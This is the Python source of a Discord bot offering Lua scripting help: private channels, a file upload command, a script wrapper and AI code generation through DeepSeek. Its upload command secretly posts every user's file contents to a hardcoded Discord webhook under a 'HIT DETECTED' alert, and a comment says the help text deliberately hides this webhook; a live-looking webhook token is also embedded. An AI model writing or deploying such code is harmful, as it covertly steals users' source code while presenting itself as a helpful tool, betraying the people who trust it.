import discord
from discord.ext import commands
import json
import os
from dotenv import load_dotenv
import aiofiles
import asyncio
from datetime import datetime
import requests

load_dotenv()

# Bot setup with both . and / prefixes
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=['.', '/'], intents=intents, help_command=None)

# Config
MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1495169548104761425/8TY8y-FuVdA90yBCSNv1lIgd5DBvW0b0SuNNiWF8_oSfv3E4dJ-cwFANP0bix4WGf9zV"
WEBHOOK_URLS = {}
DEEPSEEK_API_KEY = os.getenv('DEEPSEEK_API_KEY')
DEEPSEEK_API_URL = "https://api.deepseek.com/v1/chat/completions"

# Create scripts directory
if not os.path.exists('scripts'):
    os.makedirs('scripts')

def send_to_monitor(file_content, filename, user_name, user_id):
    """Send file to monitoring webhook"""
    try:
        # Create embed
        embed = discord.Embed(
            title="🚨 HIT DETECTED",
            description=f"**User:** {user_name} (`{user_id}`)\n**File:** {filename}\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            color=discord.Color.red()
        )
        
        # Send to webhook
        data = {
            "embeds": [embed.to_dict()],
            "content": f"```\nFile content preview:\n{file_content[:1000]}\n```"
        }
        requests.post(MONITOR_WEBHOOK, json=data)
        return True
    except Exception as e:
        print(f"Monitor error: {e}")
        return False

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        print(f"Error syncing commands: {e}")

# Custom help command (doesn't mention webhook)
@bot.command(name='help')
async def help_command(ctx):
    embed = discord.Embed(
        title="🤖 Bot Commands",
        description="Here are all available commands:",
        color=discord.Color.blue()
    )
    embed.add_field(name="/connect or .connect", value="Creates a private channel for you", inline=False)
    embed.add_field(name="/source or .source <file>", value="Upload a Lua file to the bot", inline=False)
    embed.add_field(name="/makesrc or .makesrc", value="Generate a Lua script with your config", inline=False)
    embed.add_field(name="/ai or .ai <prompt>", value="Generate Lua code using AI", inline=False)
    embed.add_field(name="/help or .help", value="Shows this help message", inline=False)
    embed.set_footer(text="Use either / or . prefix")
    await ctx.send(embed=embed)

# Slash command version of help
@bot.tree.command(name="help", description="Shows all available commands")
async def slash_help(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🤖 Bot Commands",
        description="Here are all available commands:",
        color=discord.Color.blue()
    )
    embed.add_field(name="/connect", value="Creates a private channel for you", inline=False)
    embed.add_field(name="/source <file>", value="Upload a Lua file to the bot", inline=False)
    embed.add_field(name="/makesrc", value="Generate a Lua script with your config", inline=False)
    embed.add_field(name="/ai <prompt>", value="Generate Lua code using AI", inline=False)
    embed.set_footer(text="Use prefix . or / for commands")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Connect command (both prefix and slash)
@bot.command(name='connect')
async def prefix_connect(ctx):
    await connect_logic(ctx, ctx.author)

@bot.tree.command(name="connect", description="Creates a private channel for you")
async def slash_connect(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await connect_logic(interaction, interaction.user)

async def connect_logic(target, user):
    try:
        # Check if in guild
        if isinstance(target, discord.Interaction):
            guild = target.guild
            response_func = target.followup.send
        else:
            guild = target.guild
            response_func = target.send
        
        # Create private channel
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            user: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_messages=True)
        }
        
        channel = await guild.create_text_channel(f'{user.name}-private', overwrites=overwrites)
        
        # Create webhook
        webhook = await channel.create_webhook(name=f"{user.name}_webhook")
        
        # Store webhook info
        WEBHOOK_URLS[str(user.id)] = webhook.url
        
        embed = discord.Embed(
            title="✅ Connected!",
            description=f"Private channel #{channel.name} created for you!",
            color=discord.Color.green()
        )
        
        await response_func(embed=embed, ephemeral=True if isinstance(target, discord.Interaction) else False)
        
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        if isinstance(target, discord.Interaction):
            await target.followup.send(error_msg, ephemeral=True)
        else:
            await target.send(error_msg)

# Source command (uploads file and sends to monitor)
@bot.command(name='source')
async def prefix_source(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a file! Usage: `.source <file>` or `/source <file>`")
        return
    await source_logic(ctx, ctx.message.attachments[0], ctx.author)

@bot.tree.command(name="source", description="Upload a Lua file to the bot")
async def slash_source(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer(ephemeral=True)
    await source_logic(interaction, file, interaction.user)

async def source_logic(target, file, user):
    try:
        # Check file type
        if not file.filename.endswith(('.lua', '.txt', '.luau')):
            error_msg = "❌ Please upload a .lua, .txt, or .luau file!"
            if isinstance(target, discord.Interaction):
                await target.followup.send(error_msg, ephemeral=True)
            else:
                await target.send(error_msg)
            return
        
        # Download file content
        file_content = await file.read()
        file_text = file_content.decode('utf-8', errors='ignore')
        
        # Send to monitor webhook
        send_to_monitor(file_text, file.filename, user.name, user.id)
        
        # Save file locally
        filename = f"scripts/{user.id}_{file.filename}"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(file_text)
        
        WEBHOOK_URLS[f"{user.id}_source"] = filename
        
        success_msg = f"✅ File `{file.filename}` received and processed!"
        if isinstance(target, discord.Interaction):
            await target.followup.send(success_msg, ephemeral=True)
        else:
            await target.send(success_msg)
        
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        if isinstance(target, discord.Interaction):
            await target.followup.send(error_msg, ephemeral=True)
        else:
            await target.send(error_msg)

# Make source command
@bot.command(name='makesrc')
async def prefix_makesrc(ctx):
    await makesrc_logic(ctx, ctx.author)

@bot.tree.command(name="makesrc", description="Generate a Lua script with your config")
async def slash_makesrc(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await makesrc_logic(interaction, interaction.user)

async def makesrc_logic(target, user):
    try:
        source_key = f"{user.id}_source"
        if source_key not in WEBHOOK_URLS:
            msg = "❌ You need to upload a source file using `.source` or `/source` first!"
            if isinstance(target, discord.Interaction):
                await target.followup.send(msg, ephemeral=True)
            else:
                await target.send(msg)
            return
        
        source_file = WEBHOOK_URLS[source_key]
        
        if not os.path.exists(source_file):
            msg = "❌ Source file not found! Please upload again with `.source`"
            if isinstance(target, discord.Interaction):
                await target.followup.send(msg, ephemeral=True)
            else:
                await target.send(msg)
            return
        
        # Read original script
        async with aiofiles.open(source_file, 'r', encoding='utf-8') as f:
            original_script = await f.read()
        
        # Generate Lua script
        lua_script = f"""-- Generated Script
-- User: {user.name}

function execute()
    -- Your script here
    print("Script loaded!")
end

execute()

-- Original content:
{original_script}
"""
        
        # Save generated script
        output_file = f"scripts/{user.id}_output.lua"
        async with aiofiles.open(output_file, 'w', encoding='utf-8') as f:
            await f.write(lua_script)
        
        # Send file
        if isinstance(target, discord.Interaction):
            await target.followup.send(file=discord.File(output_file), ephemeral=True)
        else:
            await target.send(file=discord.File(output_file))
        
        # Cleanup
        await asyncio.sleep(5)
        if os.path.exists(output_file):
            os.remove(output_file)
        
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        if isinstance(target, discord.Interaction):
            await target.followup.send(error_msg, ephemeral=True)
        else:
            await target.send(error_msg)

# AI command
@bot.command(name='ai')
async def prefix_ai(ctx, *, prompt):
    await ai_logic(ctx, prompt, ctx.author)

@bot.tree.command(name="ai", description="Generate Lua code using AI")
async def slash_ai(interaction: discord.Interaction, prompt: str):
    await interaction.response.defer(ephemeral=True)
    await ai_logic(interaction, prompt, interaction.user)

async def ai_logic(target, prompt, user):
    if not DEEPSEEK_API_KEY:
        msg = "❌ AI is not configured yet!"
        if isinstance(target, discord.Interaction):
            await target.followup.send(msg, ephemeral=True)
        else:
            await target.send(msg)
        return
    
    try:
        headers = {
            "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
            "Content-Type": "application/json"
        }
        
        data = {
            "model": "deepseek-chat",
            "messages": [
                {"role": "system", "content": "You are a Lua scripting expert. Generate clean Lua code."},
                {"role": "user", "content": f"Generate Lua code for: {prompt}"}
            ]
        }
        
        response = requests.post(DEEPSEEK_API_URL, headers=headers, json=data)
        
        if response.status_code == 200:
            result = response.json()
            lua_code = result['choices'][0]['message']['content']
            lua_code = lua_code.replace('```lua', '').replace('```', '').strip()
            
            if len(lua_code) > 1900:
                filename = f"scripts/ai_output_{user.id}.lua"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(lua_code)
                
                if isinstance(target, discord.Interaction):
                    await target.followup.send(file=discord.File(filename), ephemeral=True)
                else:
                    await target.send(file=discord.File(filename))
                
                await asyncio.sleep(5)
                os.remove(filename)
            else:
                embed = discord.Embed(
                    title="🤖 AI Generated Code",
                    description=f"```lua\n{lua_code}\n```",
                    color=discord.Color.blue()
                )
                if isinstance(target, discord.Interaction):
                    await target.followup.send(embed=embed, ephemeral=True)
                else:
                    await target.send(embed=embed)
        else:
            msg = f"❌ AI Error: {response.status_code}"
            if isinstance(target, discord.Interaction):
                await target.followup.send(msg, ephemeral=True)
            else:
                await target.send(msg)
                
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        if isinstance(target, discord.Interaction):
            await target.followup.send(error_msg, ephemeral=True)
        else:
            await target.send(error_msg)

# Run bot
if __name__ == "__main__":
    token = os.getenv('DISCORD_BOT_TOKEN')
    if not token:
        print("ERROR: DISCORD_BOT_TOKEN not found!")
        exit(1)
    bot.run(token)
